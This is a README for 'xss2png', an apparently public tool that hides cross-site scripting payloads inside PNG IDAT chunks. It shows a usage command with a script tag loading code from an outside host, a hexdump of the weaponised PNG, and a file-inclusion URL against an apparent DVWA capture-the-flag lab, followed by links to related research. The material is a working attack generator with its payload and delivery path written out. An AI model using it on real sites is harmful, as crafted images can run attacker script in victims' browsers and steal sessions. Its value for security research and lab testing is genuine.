# xss2png
PNG IDAT chunks XSS payload generator

A simple tool to generate PNG images with XSS payloads stored in PNG IDAT chunks

*Huge thanks to Nathaniel McHugh for sharing his PHP source code with me*

### Usage

```
~/$ python3 xss2png.py -p "<SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>" -o xss.png
               ____                    
 __  _____ ___|___ \ _ __  _ __   __ _ 
 \ \/ / __/ __| __) | '_ \| '_ \ / _` |
  >  <\__ \__ \/ __/| |_) | | | | (_| |
 /_/\_\___/___/_____| .__/|_| |_|\__, |
                    |_|          |___/
 PNG IDAT chunks XSS payload generator

[i] Using payload: <SCRIPT SRC=//XSS.VAVKAMIL.CZ></SCRIPT>

[i] Generating final PNG output
[!] PNG output saved as: xss.png
```
### Example

<img src="xss.png">

```
~/$ hexdump -C xss.png 
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 79 49 44 41  54 78 9c 63 fc 3c 53 43  |....yIDATx.c.<SC|
00000030  52 49 50 54 20 53 52 43  3d 2f 2f 58 53 53 2e 56  |RIPT SRC=//XSS.V|
00000040  41 56 4b 41 4d 49 4c 2e  43 5a 3e 3c 2f 53 43 52  |AVKAMIL.CZ></SCR|
00000050  49 50 54 3e 20 a0 ff ba  e3 fc ab 7f cf dc 0c 7b  |IPT> ..........{|
00000060  c5 f2 d2 cb 43 f1 c1 fd  db 2a cf df de ff fc ff  |....C....*......|
00000070  f9 87 1f 56 7f ff f2 04  7a 5c bf 72 f7 ca b3 37  |...V....z\.r...7|
00000080  9a 7a 6b 3b fb 18 19 19  46 c1 28 18 05 a3 60 14  |.zk;....F.(...`.|
00000090  8c 82 51 30 0a 46 c1 28  18 05 43 0e 00 00 1b 22  |..Q0.F.(..C...."|
000000a0  26 02 5b 4d 02 76 00 00  00 00 49 45 4e 44 ae 42  |&.[M.v....IEND.B|
000000b0  60 82                                             |`.|
000000b2
````

`https://dvwa.capturetheflag.cz/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`

### Credits

fin1te  
Adam Logue  
huntergregal  
IDontPlayDarts  
Masato Kinugawa  
Nathaniel McHugh

### Relevant posts

06-2012 [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

11-2015 [Bug-hunter's Sorrow](https://www.slideshare.net/masatokinugawa/avtokyo-bug-hunters-sorrow-en)

01-2016 [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

03-2016 [Revisiting XSS payloads in PNG IDAT chunks](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/)

### Other tools

[PNG-IDAT-chunks](https://github.com/vavkamil/old-repos-backup/tree/master/PNG-IDAT-chunks-master)

[PNG-IDAT-Payload-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)

### Stack Overflow

[PHP shell on PNG's IDAT Chunk](https://stackoverflow.com/questions/49144776/php-shell-on-pngs-idat-chunk)
